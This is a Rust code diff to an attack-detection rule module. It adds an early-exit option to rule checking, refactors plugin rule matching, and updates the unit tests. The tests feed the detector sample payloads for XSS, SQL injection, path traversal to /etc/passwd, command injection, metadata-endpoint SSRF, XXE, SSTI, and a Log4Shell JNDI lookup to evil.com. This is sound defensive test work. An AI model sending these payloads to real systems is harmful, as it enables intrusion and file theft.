@@ -243,11 +243,14 @@ pub static COMPILED_RULES: Lazy<HashMap<&'static str, Regex>> = Lazy::new(|| {
 static PLUGIN_RULE_CACHE: Lazy<Mutex<HashMap<String, (String, Regex)>>> =
     Lazy::new(|| Mutex::new(HashMap::new()));
 
-pub fn check_rules(text: &str, compiled_rules: &HashMap<&str, Regex>) -> (bool, Vec<String>) {
+pub fn check_rules(text: &str, compiled_rules: &HashMap<&str, Regex>, early_exit: bool) -> (bool, Vec<String>) {
     let mut matched = Vec::new();
     for (attack_type, pattern) in compiled_rules.iter() {
         if pattern.is_match(text) {
             matched.push(attack_type.to_string());
+            if early_exit {
+                return (true, matched);
+            }
         }
     }
     (!matched.is_empty(), matched)
@@ -285,12 +288,11 @@ pub fn evaluate_plugin_rules(
                         (cache_key_clone.clone(), Regex::new("$^").unwrap())
                     }
                 }
-            })
-            .1
-            .clone();
+            });
+        let is_match = regex.1.is_match(text);
         drop(cache);
 
-        if regex.is_match(text) {
+        if is_match {
             matched.push(attack_type.to_string());
         }
     }
@@ -301,7 +303,7 @@ pub fn evaluate_plugin_rules(
 #[cfg(feature = "plugin-system")]
 #[cfg_attr(not(test), allow(dead_code))]
 pub fn check_rules_with_plugins(text: &str) -> (bool, Vec<String>) {
-    let (_builtin_matched, builtin_types) = check_rules(text, &COMPILED_RULES);
+    let (_builtin_matched, builtin_types) = check_rules(text, &COMPILED_RULES, false);
 
     let plugin_rules_map = crate::plugins::get_plugin_detection_rules();
     let plugin_rules: HashMap<&str, Vec<&str>> = plugin_rules_map
@@ -333,28 +335,28 @@ mod tests {
 
     #[test]
     fn test_xss_detection() {
-        let (is_malicious, types) = check_rules("<script>alert(1)</script>", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("<script>alert(1)</script>", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"xss".to_string()));
     }
 
     #[test]
     fn test_sql_injection_detection() {
-        let (is_malicious, types) = check_rules("' OR 1=1 --", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("' OR 1=1 --", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"sql_injection".to_string()));
     }
 
     #[test]
     fn test_path_traversal_detection() {
-        let (is_malicious, types) = check_rules("../../../etc/passwd", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("../../../etc/passwd", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"path_traversal".to_string()));
     }
 
     #[test]
     fn test_rce_detection() {
-        let (is_malicious, types) = check_rules("; cat /etc/passwd", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("; cat /etc/passwd", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"rce".to_string()));
     }
@@ -362,7 +364,7 @@ mod tests {
     #[test]
     fn test_ssrf_detection() {
         let (is_malicious, types) =
-            check_rules("http://169.254.169.254/latest/meta-data/", &COMPILED_RULES);
+            check_rules("http://169.254.169.254/latest/meta-data/", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"ssrf".to_string()));
     }
@@ -372,6 +374,7 @@ mod tests {
         let (is_malicious, types) = check_rules(
             "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
             &COMPILED_RULES,
+            false,
         );
         assert!(is_malicious);
         assert!(types.contains(&"xxe".to_string()));
@@ -379,21 +382,21 @@ mod tests {
 
     #[test]
     fn test_ssti_detection() {
-        let (is_malicious, types) = check_rules("{{7*7}}", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("{{7*7}}", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"ssti".to_string()));
     }
 
     #[test]
     fn test_file_upload_detection() {
-        let (is_malicious, types) = check_rules("shell.php", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("shell.php", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"file_upload".to_string()));
     }
 
     #[test]
     fn test_scanner_detection() {
-        let (is_malicious, types) = check_rules("sqlmap/1.0", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("sqlmap/1.0", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"scanner".to_string()));
     }
@@ -401,21 +404,21 @@ mod tests {
     #[test]
     fn test_normal_request() {
         let (is_malicious, types) =
-            check_rules("hello world this is a normal request", &COMPILED_RULES);
+            check_rules("hello world this is a normal request", &COMPILED_RULES, false);
         assert!(!is_malicious);
         assert!(types.is_empty());
     }
 
     #[test]
     fn test_case_insensitive() {
-        let (is_malicious, types) = check_rules("<SCRIPT>ALERT(1)</SCRIPT>", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("<SCRIPT>ALERT(1)</SCRIPT>", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"xss".to_string()));
     }
 
     #[test]
     fn test_log4shell() {
-        let (is_malicious, types) = check_rules("${jndi:ldap://evil.com/a}", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("${jndi:ldap://evil.com/a}", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"rce".to_string()));
     }
@@ -425,6 +428,7 @@ mod tests {
         let (is_malicious, types) = check_rules(
             "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
             &COMPILED_RULES,
+            false,
         );
         assert!(is_malicious);
         assert!(types.contains(&"rce".to_string()));
@@ -432,14 +436,14 @@ mod tests {
 
     #[test]
     fn test_union_select() {
-        let (is_malicious, types) = check_rules("UNION SELECT 1,2,3--", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("UNION SELECT 1,2,3--", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"sql_injection".to_string()));
     }
 
     #[test]
     fn test_multiple_attack_types() {
-        let (is_malicious, types) = check_rules("<script> UNION SELECT 1,2,3--", &COMPILED_RULES);
+        let (is_malicious, types) = check_rules("<script> UNION SELECT 1,2,3--", &COMPILED_RULES, false);
         assert!(is_malicious);
         assert!(types.contains(&"xss".to_string()));
         assert!(types.contains(&"sql_injection".to_string()));
